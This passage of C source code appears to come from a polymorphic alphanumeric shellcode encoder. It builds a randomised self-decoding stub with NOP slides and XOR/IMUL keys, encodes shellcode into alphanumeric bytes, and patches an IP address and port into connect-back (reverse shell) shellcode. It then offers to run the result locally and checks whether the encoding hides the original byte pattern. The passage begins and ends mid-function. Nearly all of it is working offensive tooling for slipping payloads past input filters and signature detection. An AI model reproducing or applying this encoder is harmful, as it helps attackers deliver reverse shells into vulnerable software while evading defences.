    negative_offset_size_decoder1      = 9;                                                        //                              |   |
    negative_offset_size_decoder2      = 12;                                                       //                              |   |
    negative_offset_size_decoder3      = 15;                                                       //                              |   |
                                                                                                   //                              |   |
    offset_half_size_decoder           = 6;                                                        //                              |   |
    offset_terminating_key             = 8;                                                        //                              |   |
    offset_jne_xor1                    = 21;                                                       //                              |   |
    offset_size_decoder_min_1          = 24;                                                       //                              |   |
                                                                                                   //                              |   |
    offset_imul_key_offset1            = 14 + decoder_length_section1;                             //                              |   |
    offset_imul_key_offset2            = 17 + decoder_length_section1;                             //                              |   |
    offset_size_decoder_pls_2          = 21 + decoder_length_section1;                             //                              |   |
    offset_imul_key_offset3            = 24 + decoder_length_section1;                             //                              |   |
                                                                                                   //                              |   |
    offset_nop_slide1                   = decoder_length_section1+                                 //                              |   |
                                         decoder_length_section2;                                  //                              |   |
    offset_nop_slide2                   = decoder_length_section1+                                 //                              |   |
                                         decoder_length_section2+                                  //                              |   |
                                         size_nop_slide1+                                          //                              |   |
                                         imul_instruction_length;                                  //                              |   |
                                                                                                   //                              |   |
    offset_imul_instruction1           = offset_imul_instruction;                                  //                              |   |
    offset_imul_instruction2           = offset_imul_instruction+1;                                //                              |   |
    offset_imul_instruction3           = offset_imul_instruction+2;                                //                              |   |
    offset_imul_instruction4           = offset_imul_instruction+3;                                //                              |   |
                                                                                                   //                              |   |
                                                                                                   //                              |   |
    offset_imul_key                    = offset_imul_instruction4;                                 //                              |   |
                                                                                                   //                              |   |
    offset_jne_xor2                    = size_decoder-1;                                           //                              |   |
    jne_xor_negative_offset            = decoder_length_section3+                                  //                              |   |
                                         decoder_length_section2+                                  //                              |   |
                                         size_nop_slide2+                                          //                              |   |
                                         imul_instruction_length+                                  //                              |   |
                                         size_nop_slide1;                                          //                              |   |
                                                                                                   //                              |   |
                                                                                                   //                              |   |
    printf("size_decoder=0x%2X - %s\n",                                                            //                              |   |
        (UCHAR)size_decoder,                                                                       //////                          |   |
        is_alnum((UCHAR)size_decoder+(decoder_version_1?0:2))?"valid":"invalid - not alphanumeric!!!");//                          |   |
    *(decoder+offset_imul_instruction3)                 = size_decoder+(decoder_version_1?0:2);    //////                          |   |
                                                                                                   //                              |   |
    printf("half_size_decoder=0x%2X - %s\n",                                                       //                              |   |
        (UCHAR)half_size_decoder,                                                                  //                              |   |
        is_alnum((UCHAR)half_size_decoder)?"valid":"invalid - not alphanumeric!!!");               //                              |   |
    *(decoder+offset_half_size_decoder)                   = half_size_decoder;                     //                              |   |
                                                                                                   //                              |   |
    printf("offset_imul_key=0x%2X - %s\n",                                                         //                              |   |
        (UCHAR)offset_imul_key,                                                                    //                              |   |
        is_alnum((UCHAR)offset_imul_key)?"valid":"invalid - not alphanumeric!!!");                 //                              |   |
    *(decoder+offset_imul_key_offset1)                    = offset_imul_key;                       //                              |   |
    *(decoder+offset_imul_key_offset2)                    = offset_imul_key;                       //                              |   |
    *(decoder+offset_imul_key_offset3)                    = offset_imul_key;                       //                              |   |
    //                                                                                             //                              |   |
    printf("size_decoder-1=0x%2X - %s\n",                                                          //                              |   |
        (UCHAR)size_decoder-1,                                                                     //                              |   |
        is_alnum((UCHAR)(size_decoder-1))?"valid":"invalid - not alphanumeric!!!");                //                              |   |
    *(decoder+offset_size_decoder_min_1)                  = size_decoder-1;                        //                              |   |
                                                                                                   //                              |   |
    printf("size_decoder+2=0x%2X - %s\n",                                                          //                              |   |
        (UCHAR)size_decoder+2,                                                                     ////////                        |   |
        is_alnum((UCHAR)(size_decoder+(decoder_version_1?2:0)))?"valid":"invalid - not alphanumeric!!!");//                        |   |
    *(decoder+offset_size_decoder_pls_2)                = size_decoder+(decoder_version_1?2:0);    ////////                        |   |
                                                                                                   //                              |   |
    *(decoder+size_decoder-negative_offset_size_decoder1) = size_decoder;                          //                              |   |
    *(decoder+size_decoder-negative_offset_size_decoder2) = size_decoder;                          //                              |   |
    *(decoder+size_decoder-negative_offset_size_decoder3) = size_decoder;                          //////////////////////////////  |   |
                                                                                                                               //  |   |
    *(decoder+offset_jne_xor1)                     = get_two_xor_complemets_for_byte_and_xor((UCHAR)(-jne_xor_negative_offset),//  |   |
                                                                                             '\xFF',                           //  |   |
                                                                                             0);                               //  |   |
    *(decoder+offset_jne_xor2)                     = get_two_xor_complemets_for_byte_and_xor((UCHAR)(-jne_xor_negative_offset),//  |   |
                                                                                             '\xFF',                           //  |   |
                                                                                             1);                               //  |   |
#ifdef CONNECT_BACK_SHELLCODE                                                                                                  //  |   |
    ip_address                                     = ip_str_to_dw(IP_ADDRESS);///////////////////////////////////////////////////  |   |
    if (ip_address == -1)    ///////////////////////////////////////////////////                                                   |   |
        exit(-1);            //                                                                                                    |   |
                             ///////////////////////////////////                                                                   |   |
    //set shellcode with ip address and port for connect-back //                                                                   |   |
    ///*                                                      //////////                                                           |   |
    *((DWORD *)(p_shellcode+OFFSET_IP_ADDRESS))           = ip_address;/////////////////                                           |   |
    *((DWORD *)(p_shellcode+OFFSET_TCP_PORT_NUMBER))      = my_htonl(TCP_PORT_NUMBER);//                                           |   |
    *(p_shellcode+OFFSET_TCP_PORT_NUMBER)                 = (UCHAR)2;                 //                                           |   |
#endif                                        //////////////////////////////////////////                                           |   |
    //*/                                      //                                                                                   |   |
    //set decoder with 'random' nop slides    //                                                                                   |   |
    strncpy(decoder+offset_nop_slide1,        ////////////////////////////                                                         |   |
            shuffle(get_nop_slide(size_nop_slide1, 1), size_nop_slide1),//                                                         |   |
            size_nop_slide1);                                           //                                                         |   |
    strncpy(decoder+offset_nop_slide2,                                  //                                                         |   |
            shuffle(get_nop_slide(size_nop_slide2, 2), size_nop_slide2),//                                                         |   |
            size_nop_slide2);              ///////////////////////////////                                                         |   |
                                           //                                                                                      |   |
    //set decoder with random initial key  ////////////////////////////////////////////                                            |   |
    *(decoder+offset_imul_key)                            = get_random_alnum_value();//                                            |   |
    printf("initial key=0x%2X - %s\n",                                               //////////////                                |   |
           (UCHAR)*(decoder+offset_imul_key),                                                    //                                |   |
           is_alnum((UCHAR)*(decoder+offset_imul_key))?"valid":"invalid - not alphanumeric!!!"); //                                |   |
                                                                                                 //                                |   |
                                                                                     //////////////                                |   |
                                                                                     //                                            |   |
    //set decoder with 'random' dword pushes for registers we won't use              ////////////////                              |   |
    *(decoder+OFFSET_PUSH_DWORD1)                         = get_random_alnum_push_dword_opcode();  //                              |   |
    printf("push dword1=0x%2X - %s\n",                                                             //                              |   |
           (UCHAR)*(decoder+OFFSET_PUSH_DWORD1),                                                   //                              |   |
           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD1))?"valid":"invalid - not alphanumeric!!!");//                              |   |
    *(decoder+OFFSET_PUSH_DWORD2)                         = get_random_alnum_push_dword_opcode();  //                              |   |
    printf("push dword2=0x%2X - %s\n",                                                             //                              |   |
           (UCHAR)*(decoder+OFFSET_PUSH_DWORD2),                                                   //                              |   |
           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD2))?"valid":"invalid - not alphanumeric!!!");//                              |   |
    *(decoder+OFFSET_PUSH_DWORD3)                         = get_random_alnum_push_dword_opcode();  //                              |   |
    printf("push dword3=0x%2X - %s\n",                                                             //                              |   |
           (UCHAR)*(decoder+OFFSET_PUSH_DWORD3),                                                   //                              |   |
           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD3))?"valid":"invalid - not alphanumeric!!!");//                              |   |
    *(decoder+OFFSET_PUSH_DWORD4)                         = get_random_alnum_push_dword_opcode();  //                              |   |
    printf("push dword4=0x%2X - %s\n",                                                             //                              |   |
           (UCHAR)*(decoder+OFFSET_PUSH_DWORD4),                                                   //                              |   |
           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD4))?"valid":"invalid - not alphanumeric!!!");//                              |   |
                                                                                                   //                              |   |
    //bugfix: this time after srand() :)                                                           //                              |   |
    xor_al1=get_random_alnum_value();                                                              //                              |   |
    xor_al2=get_random_alnum_value();                                                              //                              |   |
    *(decoder+OFFSET_XOR_AL1_A) = xor_al1;                                                         //                              |   |
    *(decoder+OFFSET_XOR_AL1_B) = xor_al1;                                                         //                              |   |
    *(decoder+OFFSET_XOR_AL2_A) = xor_al2;                                                         //                              |   |
    *(decoder+OFFSET_XOR_AL2_B) = xor_al2;                                                         //                              |   |
                                                                                                   //                              |   |
    memcpy(decoder+OFFSET_RANDOMIZED_DECODER_HEAD,                                             //////                              |   |
           randomize_decoder_head(decoder, size_decoder, xor_al1, *(decoder+offset_jne_xor1)), // <---here-------------------------|---'
           SIZE_RANDOMIZED_DECODER_HEAD);                                                      //////                              |
    //set first xor1 to random alnum value (this is the first byte of the encoded data)            //                              |
    xor1                                                  = get_random_alnum_value();              //                              |
    printf("xor1=0x%2X - %s\n",                                                                    //                              |
           (UCHAR)xor1,                                                                            //                              |
           is_alnum((UCHAR)xor1)?"valid":"invalid - not alphanumeric!!!");                         //                              |
                                            /////////////////////////////////////////////////////////                              |
RE_RUN:                                     //                                                                                     |
    sprintf(alnum_shellcode, "%s",decoder); //                                                                                     |
    memset(temp_buf, 0, 3);///////////////////                                                                                     |
    for(i=0; i<size; i++)  //                                                                                                      |
    {   /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////      |
        // each original byte is encoded into 3 alphanumeric bytes where first_byte*third_byte^second_byte==original_byte  //      |
        // third_byte is the next encoded original byte's first_byte                                                       //      |
        // the first byte of the terminating key is the last byte's third_byte                                             /////// |
        p_xor2_key=get_xor2_and_key_for_xor1_and_c(xor1, shellcode[i]);//get a list of second_byte and third_byte for first_byte// |
        if(!p_xor2_key)                                                                                                    /////// |
            goto RE_RUN;                                                                                                   //      |
        p_xor2_key = choose_random_node(p_xor2_key);//choose a random combination////////////////////////////////////////////      |
        key=p_xor2_key->key;                                           //                                                          |
        xor2=p_xor2_key->xor2;                                         //                                                          |
        temp_buf[0] = xor1;                                            //                                                          |
        temp_buf[1] = xor2;                                            //                                                          |
        strcat(alnum_shellcode, temp_buf); // append it to our decoder //                                                          |
        xor1=key;                                                      //                                                          |
        free_p_xor2_key(p_xor2_key); // free the list                  //                                                          |
    } //get next original_byte                                         //                                                          |
                                                                       ////////////////////////                                    |
    if (terminating_key_exist(alnum_shellcode+sizeof(decoder), str_end_of_encoded_shellcode))//                                    |
    {                                                                                        //                                    |
        printf("error - terminating key found in encoded shellcode. running again to fix\n");//                                    |
        goto RE_RUN;                                                                         //                                    |
    }                                     /////////////////////////////////////////////////////                                    |
    *(UCHAR*)(alnum_shellcode+8)  = key; // set the last key of the encoded data to be the first byte of the terminating string    |
    *(UCHAR*)(alnum_shellcode+9)  = get_random_alnum_value(); // choose 3 random alnum bytes for the rest of the terminating string|
    *(UCHAR*)(alnum_shellcode+10) = get_random_alnum_value(); // choose 3 random alnum bytes for the rest of the terminating string|
    *(UCHAR*)(alnum_shellcode+11) = get_random_alnum_value(); // choose 3 random alnum bytes for the rest of the terminating string|
    strncat(alnum_shellcode,                                  // append the terminating string to the decoder+encoded shellcode    |
            (UCHAR*)(alnum_shellcode+offset_terminating_key), //////////////////////////////                                       |
            4);                                                                           //                                       |
                                                                                          //                                       |
    //bugfix: handle case of esp pointing to shellcode                                    //                                       |
    if (!strcmp(Q(REGISTER_WITH_ADDRESS_OF_SHELLCODE), "esp"))                            //                                       |
    {                                                                                     //                                       |
        //    _asm{                                                                       //                                       |
        //        push esp;                                                               //                                       |
        //        pop eax;                                                                //                                       |
        //        xor al, 0x36;                                                           //                                       |
        //        xor al, 0x30;                                                           //                                       |
        //    }                                                                           //                                       |
        p_alnum_shellcode = malloc(strlen(alnum_shellcode)+1+6);                          //                                       |
        memset(p_alnum_shellcode, 0, strlen(alnum_shellcode)+1+6);                        //                                       |
        memcpy(p_alnum_shellcode+6, alnum_shellcode, strlen(alnum_shellcode)+1);          //                                       |
        p_alnum_shellcode[0] = 'T';                                                       //                                       |
        p_alnum_shellcode[1] = 'X'; // todo: randomize by using other registers than eax  //                                       |
        p_alnum_shellcode[2] = '4'; //       and using other xor values                   //                                       |
        p_alnum_shellcode[3] = '6'; // <-- (x+6)                                          //                                       |
        p_alnum_shellcode[4] = '4'; //                                                    //                                       |
        p_alnum_shellcode[5] = '0'; // <-- x                                              //                                       |
        p_alnum_shellcode[8] = get_push_register_instruction("eax");                      //                                       |
        p_alnum_shellcode[9] = get_push_register_instruction("eax");                      //                                       |
        size_decoder += 6;                                                                //                                       |
    }                                                                                     //                                       |
                                                                                          //                                       |
    printf("encoded shellcode length: %d\n", strlen(alnum_shellcode)-size_decoder);       //                                       |
    printf("decoder length: %d\n%s\n",                                                    //                                       |
        size_decoder,                                                                     //                                       |
        p_alnum_shellcode);                                                               //                                       |
                                                                                          //                                       |
    printf("scanning alnum_shellcode for shellcode up to size bytes\n");                  //                                       |
    found_msg = scan_str_known_pattern(alnum_shellcode, shellcode, size);                 /////////                                |
    if (found_msg) printf("shellcode found encoded in alnum_shellcode using %s.\n", found_msg);  //                                |
    else printf("shellcode not found encoded in alnum_shellcode.\n");   ///////////////////////////                                |
                                                                        //                                                         |
    if (str_is_alnum(alnum_shellcode))                                  //                                                         |
    {                                                                   //                                                         |
        printf("execute shellcode locally? (hit: y and press enter): ");//                                                         |
        if(tolower(getchar()) == 'y')                                   //                                                         |
        {                                                    /////////////                                                         |
            _asm                                             //                                                                    |
            {                                                //                                                                    |
                push p_alnum_shellcode;                ////////                                                                    |
                pop REGISTER_WITH_ADDRESS_OF_SHELLCODE;// <------------------------------------------------------------------------'
                //jump to head of decoder              //
                jmp REGISTER_WITH_ADDRESS_OF_SHELLCODE;//
            }                              //////////////
        }                                  //
    }                                      //
    else                                   //
    {                                      ///////////////
        printf("error non-alphanumeric shellcode\n");   //
    }                       //////////////////////////////
                     /////////
                     //
    return 0;    //////
}                //
///////////////////

BOOL arg1_imul_arg2_xor_arg3(UCHAR *alnum_str,
                             UCHAR *known_pattern,
                             UINT known_pattern_length,
                             UINT offset1,
                             UINT offset2,
                             UINT offset3)
{
    UINT offset,
         i,
         found;

    for (i=found=offset=0; i<known_pattern_length; i++)
    {
        while(*(alnum_str+offset))
        {
            if((UCHAR)((alnum_str[offset+offset1]*alnum_str[offset+offset2])^alnum_str[offset+offset3])==
               (UCHAR)known_pattern[i])
            {
                offset+=2;
                found++;
                break;
            }
            else if((UCHAR)((alnum_str[offset+offset1+1]*alnum_str[offset+offset2+1])^alnum_str[offset+offset3+1])==
                    (UCHAR)known_pattern[i])
            {
                offset+=3;
                found++;
                break;
            }
            else
            {
                found=0;
                i=0;
                offset++;
            }
        }
    }
    if(found == known_pattern_length)
        return 1;
    else
        return 0;
}
BOOL arg1_xor_arg2_imul_arg3(UCHAR *alnum_str,
                             UCHAR *known_pattern,
                             UINT known_pattern_length,
                             UINT offset1,
                             UINT offset2,
                             UINT offset3)
{
    UINT offset,
         i,
         found;

    for (i=found=offset=0; i<known_pattern_length; i++)
    {
        while(*(alnum_str+offset))
        {
            if((UCHAR)((alnum_str[offset+offset1]^alnum_str[offset+offset2])*alnum_str[offset+offset3])==
               (UCHAR)known_pattern[i])
            {
                offset+=2;
                found++;
                break;
            }
            else if((UCHAR)((alnum_str[offset+offset1+1]^alnum_str[offset+offset2+1])*alnum_str[offset+offset3+1])==
                    (UCHAR)known_pattern[i])
            {
                offset+=3;
                found++;
                break;
            }
            else
            {
                found=0;
                i=0;
                offset++;
            }
        }
    }
    if(found == known_pattern_length)
        return 1;
    else
        return 0;
}
BOOL arg1_imul_key_xor_arg2(UCHAR *alnum_str,
                             UCHAR *known_pattern,
                             UINT known_pattern_length,
                             UCHAR key,
                             UINT offset1,
                             UINT offset2)
{
    UINT offset,
         i,
         found;

    for (i=found=offset=0; i<known_pattern_length; i++)
    {
        while(*(alnum_str+offset))
        {
            if((UCHAR)((alnum_str[offset+offset1]*key)^alnum_str[offset+offset2])==
               (UCHAR)known_pattern[i])
            {
                offset+=2;
                found++;
                break;
            }
            else if((UCHAR)((alnum_str[offset+offset1+1]*key)^alnum_str[offset+offset2+1])==
                    (UCHAR)known_pattern[i])
            {
                offset+=3;
                found++;
                break;
            }
            else
            {
                found=0;
                i=0;
                offset++;
            }
        }
    }
    if(found == known_pattern_length)
        return 1;
    else
        return 0;
}

UCHAR *scan_str_known_pattern(UCHAR *alnum_str, UCHAR *known_pattern, UINT known_pattern_length)
{
    UCHAR *alnum = malloc(strlen(ALNUM_CHARSET)+1);
    UCHAR *temp_buf = malloc(255);
    strncpy(alnum, ALNUM_CHARSET, strlen(ALNUM_CHARSET));
    alnum[strlen(ALNUM_CHARSET)]=0;
    memset(temp_buf, 0, 255);
    //this is not for production, just a poc...
    while(*alnum) {
        if (arg1_imul_key_xor_arg2(alnum_str, known_pattern, known_pattern_length, *alnum++, 0, 1))
        {
            alnum--;
            strcat(temp_buf, "(buf[0]*'");
            temp_buf[strlen(temp_buf)] = *alnum;
            strcat(temp_buf, "')^buf[1]");
            return(temp_buf);
        }
    }
    alnum-=strlen(ALNUM_CHARSET);
    while(*alnum) {
        if (arg1_imul_key_xor_arg2(alnum_str, known_pattern, known_pattern_length, *alnum++, 1, 0))
        {
            alnum--;
            printf("key = 0x%2X ('%c')\n", *alnum, *alnum);
            return("found pattern using: (buf[1]*key)^buf[0]\n");
        }
    }
    if (arg1_imul_key_xor_arg2(alnum_str, known_pattern, known_pattern_length, 0x30, 0, 1))
        return("(buf[0]*0x30)^buf[1]");
    else if (arg1_imul_key_xor_arg2(alnum_str, known_pattern, known_pattern_length, 0x30, 1, 0))
        return("(buf[1]*0x30)^buf[0]");
    else if (arg1_imul_key_xor_arg2(alnum_str, known_pattern, known_pattern_length, 0x10, 0, 1))
        return("(buf[0]*0x10)^buf[1]");
    else if (arg1_imul_key_xor_arg2(alnum_str, known_pattern, known_pattern_length, 0x10, 1, 0))
        return("(buf[1]*0x10)^buf[0]");
    else if (arg1_imul_arg2_xor_arg3(alnum_str, known_pattern, known_pattern_length, 0, 1, 2))
        return("(buf[0]*buf[1])^buf[2]");
    else if (arg1_imul_arg2_xor_arg3(alnum_str, known_pattern, known_pattern_length, 0, 2, 1))
        return("(buf[0]*buf[2])^buf[1]");
    else if (arg1_imul_arg2_xor_arg3(alnum_str, known_pattern, known_pattern_length, 1, 2, 0))
        return("(buf[1]*buf[2])^buf[0]");
    else if (arg1_xor_arg2_imul_arg3(alnum_str, known_pattern, known_pattern_length, 0, 1, 2))
        return("(buf[0]^buf[1])*buf[2]");
    else if (arg1_xor_arg2_imul_arg3(alnum_str, known_pattern, known_pattern_length, 0, 2, 1))
        return("(buf[0]^buf[2])*buf[1]");
    else if (arg1_xor_arg2_imul_arg3(alnum_str, known_pattern, known_pattern_length, 1, 2, 0))
        return("(buf[1]^buf[2])*buf[0]");
    else
        return "";
}

BOOL is_alnum(UCHAR c)
{
    char *alnum = ALNUM_CHARSET;
    char search_c[2] = "";
    search_c[0] = c;
    return((BOOL)strstr(alnum, search_c));
}

BOOL str_is_alnum(UCHAR *str)
{
    ULONG length;
    length = strlen(str);
    for(;length>0;length--) {
        if(
            !is_alnum(str[length-1])
        )
            return 0;
    }
    return 1;
}

UCHAR get_two_xor_complemets_for_byte_and_xor(UCHAR byte, UCHAR xor, int index)
{
    int xor_complement_1, xor_complement_2;
    UCHAR two_xor_complements[3];

    for(xor_complement_1=0; xor_complement_1<MAX_BYTES; xor_complement_1++)
    {
        if (is_alnum((UCHAR)xor_complement_1))
        {
            for(xor_complement_2=0; xor_complement_2<MAX_BYTES; xor_complement_2++)
            {
                if (is_alnum((UCHAR)xor_complement_2))
                {
                    if(byte == (xor ^ xor_complement_1 ^ xor_complement_2))
                    {
                        two_xor_complements[0] = (UCHAR)xor_complement_1;
                        two_xor_complements[1] = (UCHAR)xor_complement_2;
                    }
                }
            }
        }
    }
    if(index == 0 || index == 1)
        return two_xor_complements[index];
    else
        return (UCHAR)0;
}

BOOL terminating_key_exist(UCHAR *alnum_shellcode, UCHAR *terminating_key)
{
    return (BOOL) strstr(alnum_shellcode, terminating_key);
}

DWORD ip_str_to_dw(UCHAR *str)
{
    DWORD x[4];
    int dwIpAddress;

    if (!str || MAX_IP_STR_LEN < strlen(str) || strlen(str) < MIN_IP_STR_LEN)
        return -1;

    sscanf(str, "%d.%d.%d.%d", &x[0],&x[1],&x[2],&x[3]);

    x[3] = x[3] > 255 ? -1 : (x[3] <<= 24);
    x[2] = x[2] > 255 ? -1 : (x[2] <<= 16);
    x[1] = x[1] > 255 ? -1 : (x[1] <<= 8);
    x[0] = x[0] > 255 ? -1 : (x[0] <<= 0);
    dwIpAddress = x[0]+x[1]+x[2]+x[3];


    return dwIpAddress;
}

DWORD my_htonl(DWORD dw_in)
{
    DWORD dw_out;

    *((UCHAR *)&dw_out+3) = *((UCHAR *)&dw_in+0);
    *((UCHAR *)&dw_out+2) = *((UCHAR *)&dw_in+1);
    *((UCHAR *)&dw_out+1) = *((UCHAR *)&dw_in+2);
    *((UCHAR *)&dw_out+0) = *((UCHAR *)&dw_in+3);

    return dw_out;
}

void free_p_xor2_key(struct xor2_key *node)
{
    struct xor2_key *temp = 0;

    if(node)
    {
        temp = node->prev;
        while(node->next)
        {
            node=node->next;
            free(node->prev);
        }
        free(node);
    }
    if(temp)
    {
        while(temp->prev)
        {
            temp=temp->prev;
            free(temp->next);
        }
        free(temp);
    }
}

struct xor2_key *choose_random_node(struct xor2_key *head)
{
    int num_nodes = 1, selected_node, i;
    struct xor2_key* tail = head;

    struct xor2_key* pn = NULL ;

    if (!head || !head->key)
        return 0;

    while(tail->next)
    {
        tail = tail->next;
        num_nodes++;
    }

    selected_node = rand()%num_nodes;

    for(i=0; i<selected_node; i++)
        head = head->next;

    return head;
}

struct xor2_key *get_xor2_and_key_for_xor1_and_c(UCHAR xor1, UCHAR c)
{
    struct xor2_key *p_xor2_key, *p_xor2_key_head;
    char *alnum = ALNUM_CHARSET;
    UINT    i=0,
            z=1,
            r=0,
            count=0;
    UCHAR   xor2=0,
            x=0;

    p_xor2_key_head = p_xor2_key = malloc(sizeof(xor2_key));
    p_xor2_key->prev   = 0;
    p_xor2_key->next   = 0;
    p_xor2_key->key    = 0;
    p_xor2_key->xor2   = 0;

    for(i=0; alnum[i]; i++)
    {
        for(x=0; alnum[x];x++)
        {
            xor2 = alnum[x];
            if (((UCHAR)(xor1 * alnum[i]) ^ xor2) == c)
            {
                p_xor2_key->xor2 = xor2;
                p_xor2_key->key  = alnum[i];
                p_xor2_key->next = malloc(sizeof(struct xor2_key));
                p_xor2_key->next->prev = p_xor2_key;
                p_xor2_key = p_xor2_key->next;
                p_xor2_key->key=0;
                p_xor2_key->xor2=0;
            }
        }
    }

    if(!p_xor2_key->key)
        p_xor2_key->next = 0;
    if (p_xor2_key->prev)
        p_xor2_key = p_xor2_key->prev;
    else
        return 0;
    free(p_xor2_key->next);
    p_xor2_key->next=0;
    return p_xor2_key_head;
}

UCHAR *shuffle(UCHAR str[], UINT length) //length does not include terminating null.
{
    UINT last, randomNum;
    UCHAR temporary;
    UCHAR *output = malloc(length);
    memcpy(output, str, length);
    for (last = length; last > 1; last--)
    {
       randomNum = rand( ) % last;
       temporary = output[randomNum];
       output[randomNum] = output[last-1];
       output[last-1] = temporary;
    }
    memcpy(str, output, length);
    return output;
}// taken from: http://www.warebizprogramming.com/text/cpp/section6/part8.htm


UCHAR *slide_substr_back(UCHAR *str, UINT substr_offset, UINT substr_len, UINT str_len, UINT slide)
{
    UCHAR *prefix_substr,
        *substr,
        *suffix_substr,
        *output_str;
    UINT prefix_substr_len,
        suffix_substr_len;


    if(slide > substr_offset) {
        printf("you can't slide it that far back!\n");
        return 0;
    }

    output_str = malloc(str_len);
    memset(output_str, 0 , str_len);

    suffix_substr_len = str_len-substr_len-substr_offset;
    suffix_substr = malloc(suffix_substr_len);
    memset(suffix_substr, 0, suffix_substr_len);

    prefix_substr_len = substr_offset;
    prefix_substr = malloc(prefix_substr_len);
    memset(prefix_substr, 0, prefix_substr_len);

    substr = malloc(substr_len);
    memset(substr, 0, substr_len);

    strncpy(substr, str+substr_offset, substr_len);
    strncpy(prefix_substr, str, prefix_substr_len);
    strncpy(suffix_substr, str+substr_offset+substr_len, suffix_substr_len);

    strncpy(output_str, prefix_substr, prefix_substr_len-slide);
    strncpy(output_str+prefix_substr_len-slide, substr, substr_len);
    strncpy(output_str+prefix_substr_len-slide+substr_len, str+substr_offset-slide, slide);
    strncpy(output_str+prefix_substr_len-slide+substr_len+slide, str+substr_offset+substr_len, suffix_substr_len);


    free(prefix_substr);
    free(suffix_substr);
    free(substr);
    return output_str;
}

UCHAR *slide_substr_forward(UCHAR *str, UINT substr_offset, UINT substr_len, UINT str_len, UINT slide)
{
    UCHAR *prefix_substr,
        *substr,
        *suffix_substr,
        *output_str;
    UINT prefix_substr_len,
        suffix_substr_len;


    if(slide > str_len-substr_len-substr_offset) {
        printf("you can't slide it that far forward!\n");
        return 0;
    }

    output_str = malloc(str_len);
    memset(output_str, 0 , str_len);

    suffix_substr_len = str_len-substr_len-substr_offset;
    suffix_substr = malloc(suffix_substr_len);
    memset(suffix_substr, 0, suffix_substr_len);

    prefix_substr_len = substr_offset;
    prefix_substr = malloc(prefix_substr_len);
    memset(prefix_substr, 0, prefix_substr_len);

    substr = malloc(substr_len);
    memset(substr, 0, substr_len);

    strncpy(substr, str+substr_offset, substr_len);
    strncpy(prefix_substr, str, prefix_substr_len);
    strncpy(suffix_substr, str+substr_offset+substr_len, suffix_substr_len);

    strncpy(output_str, prefix_substr, prefix_substr_len);
    strncpy(output_str+prefix_substr_len, suffix_substr, slide);
    strncpy(output_str+prefix_substr_len+slide, substr, substr_len);
    strncpy(output_str+prefix_substr_len+slide+substr_len, suffix_substr+slide, suffix_substr_len-slide);


    free(prefix_substr);
    free(suffix_substr);
    free(substr);
    return output_str;
}

UCHAR *get_nop_slide(UINT size, UINT slide)
{   //simple alnum nop slide generator
    UINT i, x, append_dec_eax = 0;
    UCHAR alnum_nop[][3] = {
        "AI", //inc ecx;dec ecx // (alnum_nop[0])
        "BJ", //inc edx;dec edx // (alnum_nop[1])
        "CK", //inc ebx;dec ebx // (alnum_nop[2])
        "EM", //inc ebp;dec ebp // (alnum_nop[3])
        "FN", //inc esi;dec esi // (alnum_nop[4])
        "GO", //inc edi;dec edi // (alnum_nop[5])                                [we don't care about eax value before the imul]
        "HG", //dec eax;inc edi // (alnum_nop[6]) --- not allowed in nop_slide_2 [instruction as it overwrites eax with result ]
        "HO", //dec eax;dec edi // (alnum_nop[7]) --- not allowed in nop_slide_2 [and we don't care about edi value at all.    ]

        "DL", //inc esp;dec esp // (alnum_nop[8]) --- [todo: need to preserve stack state] >--. //we can freely inc/dec esp for now
//      "PX", //push eax;pop eax// (alnum_nop[9]) --- [todo: need to preserve stack state] >--| //but we need to take it into account
//      "QY", //push ecx;pop ecx// (alnum_nop[10]) ---[todo: need to preserve stack state] >--| //once we start pushing/poping to/from
//      "RZ", //push edx;pop edx// (alnum_nop[11]) ---[todo: need to preserve stack state] >--' //the stack.
//                                                                                            |
//TODO:   <-----------------------------------------------------------------------------------'
//    push eax   push eax   push eax   push ecx  push edx
//    pop eax    push ecx   push ecx   dec esp   pop edx
//    push ecx   pop ecx    push edx   inc esp   push ecx
//    pop ecx    pop eax    inc esp    pop ecx   pop ecx
//    push edx   push edx   dec esp    push eax  push eax
//    pop edx    pop edx    pop edx    inc esp   pop eax
//                          pop ecx    dec esp   .
//                          pop eax    pop eax   .
//                                     push edx  .
//                                     pop edx   etc...
    };
    UCHAR *nop_slide;
    nop_slide = malloc(size);
    memset(nop_slide, 0, size);
    if(size%2)
    {
        append_dec_eax = 1;
        size--;
    }
    for(i=0; i<(size/2); i++) {
        do
            x = rand()%(sizeof(alnum_nop)/3);
        while
            ((slide==2)&&(x==6||x==7));
        strcat(nop_slide, alnum_nop[x]);
    }
    if(append_dec_eax)
    {
        strcat(nop_slide, slide==1?"H":rand()%2?"G":"O"); //dec eax or inc/dec edi - depends on which nop slide
    }
    return nop_slide;
}

UCHAR get_random_alnum_push_dword_opcode()
{
    UCHAR alnum_push_dword_opcode[] =
    {
        'P', //0x50 push eax
        'Q', //0x51 push ecx
        'R', //0x52 push edx
        'S', //0x53 push ebx
        'T', //0x54 push esp
        'U', //0x55 push ebp
        'V', //0x56 push esi
        'W'  //0x57 push edi
    };
    return alnum_push_dword_opcode[rand()%sizeof(alnum_push_dword_opcode)];
}

UCHAR get_random_alnum_value()
{
    char alnum_values[] = ALNUM_CHARSET;
    return alnum_values[rand()%strlen(alnum_values)];
}

UCHAR get_push_register_instruction(UCHAR *reg)
{
         if (!strcmp(reg, "eax")) return 'P'; //0x50 push eax
    else if (!strcmp(reg, "ecx")) return 'Q'; //0x51 push ecx
    else if (!strcmp(reg, "edx")) return 'R'; //0x52 push edx
    else if (!strcmp(reg, "ebx")) return 'S'; //0x53 push ebx
    else if (!strcmp(reg, "esp")) return 'T'; //0x54 push esp
    else if (!strcmp(reg, "ebp")) return 'U'; //0x55 push ebp
    else if (!strcmp(reg, "esi")) return 'V'; //0x56 push esi
    else if (!strcmp(reg, "edi")) return 'W'; //0x57 push edi
    else return 0;
}

UCHAR *randomize_decoder_head(UCHAR *decoder, UINT size_decoder, UCHAR xor_al1, UCHAR jne_xor1)
{
    UCHAR states[11] = {0,1,2,3,4,5,6,7,8,9,10};
    UCHAR instructions[11][3];
    UCHAR instruction_comments[11][28];
    UINT i,c, state;
    UCHAR *output;
    UCHAR *random_states;
    UCHAR *p_state[5];

    output = malloc(17);
    memset(output, 0, 17);
    memset(instructions, 0, 11*3);
    memset(instruction_comments, 0, 11*28);
    instructions[0][0] = '\x6a';         //j
    instructions[0][1] = xor_al1;        //
